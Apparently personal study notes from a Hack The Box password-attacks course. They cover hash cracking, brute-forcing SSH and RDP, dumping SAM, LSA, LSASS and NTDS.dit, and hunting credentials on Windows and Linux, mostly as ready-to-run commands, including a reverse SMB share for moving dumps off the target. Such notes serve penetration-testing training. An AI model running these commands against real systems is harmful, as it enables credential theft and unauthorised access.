---
tags:
  - lsass
  - password
  - login
  - JohnTheRipper
  - CrackMapExec
  - winrm
  - SMB
  - SSH
  - RDP
  - Hydra
  - hashcat
  - password_stuffing
  - passwords
  - questions
  - registry
  - SAM
  - banner_grabbing
  - AD
  - vulnerability_assessment
  - RAM
---


![[Pasted image 20250217144259.png]]
![[Pasted image 20250217144335.png]]

Windows Authentication Process
![[Pasted image 20250217144736.png]]


- [Credentials Processes in Windows Authentication | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)
- [Credentials Processes in Windows Authentication | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)

![[Pasted image 20250217162027.png]]


## John the Ripper 

```bash

# Single Crack Mode
john --format=<hash_type> <hash or hash_file>

# Wordlist mode
john --wordlist=<wordlist_file> --rule <hash_file>

# Incremental mode 
john --incremental <hash_file>

# Cracking files with John
<tool> <file_to_crack> > file.hash
pdf2john server_doc.pdf > server_doc.hash
john server_doc.hash
john --wordlist=<wordlist.txt> server_doc.hash

# Finding the tools 
locate *2john*


```

![[Pasted image 20250217162834.png]]


## Services and Tools

### CrackMapExec

```bash
# Usage 
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

```


### Evil-WinRM


```bash
evil-winrm -i <target-IP> -u <username> -p <password>
```

### Hydra - SSH/RDP

```bash
# SSH
hydra -L user.list -P password.list ssh://<ip>

# RDP
hydra -L user.list -P password.list rdp://<ip>
```


## Hashcat


- You can create a rule file to apply some rules to hashcat
- ![[Pasted image 20250225143304.png]]

```bash 
# Example of a custom.rule -> Will be applied to each word in the passwordlist
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

Based on the custom rule you can use hashcat to create a new file 

```bash
 hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
 cat mut_password.list
```


Common rulesets can be found under `/usr/share/hashcat/rules`

By using the Custom Word List Generator ([digininja/CeWL: CeWL is a Custom Word List Generator](https://github.com/digininja/CeWL)) we can create a worlist based on a website

```bash
GenericUser001@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
GenericUser001@htb[/htb]$ wc -l inlane.wordlist
```


## Password Reuse / Default Passwords 


[ihebski/DefaultCreds-cheat-sheet: One place for all the default credentials to assist the Blue/Red teamers activities on finding devices with default password 🛡️](https://github.com/ihebski/DefaultCreds-cheat-sheet)



## Windows Local Password Attacks 

### Attacking SAM

Registry hives for password cracking later on
- hklm\sam
- hklm\system
- hklm\security


```CMD
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```


Running an smb server on the attacker machine to be able to send data from the Target windows machine to the Attacker 

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/`


Using impacter to secretdump of the saved files 

```bash 
locate secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```


We can also dump LSA/SAM Remotely 


```bash 
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```


### Attacking LSASS


- On windows you can get  memory dump by doing a right click on a process in windows and then select `Create Memory Dump File`
- The same can be done using cli -> `rundll32.exe`

```CMD
# Finding process - cmd 
tasklist /svc

# Powershell 
Get-Process lsass

# Using Powershell for the Memory Dump -> This will for sure trigger any AV
rundll32 C:\Windows\system32\comsvcs.dll, MiniDump <process-id> C:\lsass.dmp full
```

- You can transfer all the data to your attacker machine and then start to crack this stuff offline using [skelsec/pypykatz: Mimikatz implementation in pure Python](https://github.com/skelsec/pypykatz)

`pypykatz lsa minidump /home/peter/Documents/lsass.dmp`

When trying to attack an AD, we sometimes have to create some Usernames. This we can do manually or use an tool such as [urbanadventurer/username-anarchy: Username tools for penetration testing](https://github.com/urbanadventurer/username-anarchy)

With a proper password list we are able to gain an initial footohold with crackmapexec 

```bash 
# Trying to get a foothold in the AD Controller
crackmapexec smb <ip> -u username -p <passwordlist> 
```

Once connected to the Domain Controller we can do the following 

```cmd 
# Check for local group memberships 
# To copy the NTDS.dit file we need -> 
net localgroup

# checking user permissions 
net user <username>

# Creating a Volume Shadow Copy (VSS)
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

There is also a super way fast to capture the ntds using crackmapexec 

```bash
crackmapexec smb <ip> -u <username> -p <password> --ntds 
```

### Credentials Hunting in Windows 

Use a proper search term list to find all your stuff. As for example 

- Passwords
- Username
- Users
- Configuration
- pwd
- Passphrase
- User account
- passkey
- dbcredential
- Login
- Keys
- Creds
- Passphrases
- dbpassword
- Credentials

For password credential gathering Tools such as [AlessandroZ/LaZagne: Credentials recovery project](https://github.com/AlessandroZ/LaZagne) can be used. Ideally you have an offline version of the exe you can upload later on

```cmd
sart lazagne.exe all
```

Another built in tool you could use `findstr

```bash 
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

Other typical places where you could find passwordas are at 

- Group Policy in the SYSVOL share
- scripts 
- Passwords in the AD user or computer description field
- KeePass databases --> pull hash, crack and get loads of access 

### Credential hunting Linux 

Basic Stuff to checkout
- Files
	- Configs
	- Databases
	- Notes
	- Scripts
	- Source code 
	- Cron jobs
	- SSH Keys 
- History
- Memory
	- Cache
	- In-memory Processing
- Key-Rings
	- Browser stored credentials


Filewise get a big picture overview

```bash
# Filtering for files 
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

```bash
# Filtering for Databases 
 for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

```bash
# Finding general user notes
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

```bash
# searching for scripts 
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

```bash
# Searching for private keys 
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# searching for public keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

Infos from well known log files 

![[Pasted image 20250227044622.png]]

To read credentials out of Memory and cache you can use the tool [huntergregal/mimipenguin: A tool to dump the login password from the current linux user](https://github.com/huntergregal/mimipenguin)

But you could also use LaZagne 


Browsers:
- Firefox is storing everything under `ls -l .mozilla/firefox/ | grep default`
- You can decrypt those passwords using [unode/firefox_decrypt: Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles](https://github.com/unode/firefox_decrypt)





```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak

unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Hashcat cracking unshadowed hashes 
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

```




